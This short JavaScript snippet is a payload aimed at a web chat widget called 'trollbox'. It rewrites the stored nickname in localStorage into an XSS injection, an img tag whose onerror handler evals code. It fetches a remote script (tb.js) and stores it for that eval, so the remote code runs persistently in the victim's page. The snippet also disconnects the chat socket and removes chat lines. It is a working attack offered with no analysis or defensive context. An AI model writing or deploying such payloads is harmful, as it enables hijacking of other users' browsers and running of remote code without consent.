(s=>top.location.href=URL.createObjectURL(new Blob([s],{type:'text/html'})))
(`
<script>
async function e() {
if(!localStorage.getItem('.config/trollbox/tbjb')) {
	localStorage.setItem('.config/trollbox/_nick',
		localStorage.getItem('.config/trollbox/nick'));

	localStorage.setItem('.config/trollbox/nick', \`tbjb<img src='https://' onerror='document.querySelector("#trollbox_nick_btn").innerText=localStorage.getItem(".config/trollbox/_nick");socket.disconnect(),document.body.querySelectorAll(".trollbox_line").forEach(e=>e.parentElement.removeChild(e));eval(localStorage.getItem(".config/trollbox/tbjb"))'>\`);
	localStorage.setItem('.config/trollbox/tbjb', await (await fetch('<!site>tb.js')).text())
}
}e()
</script>
`)
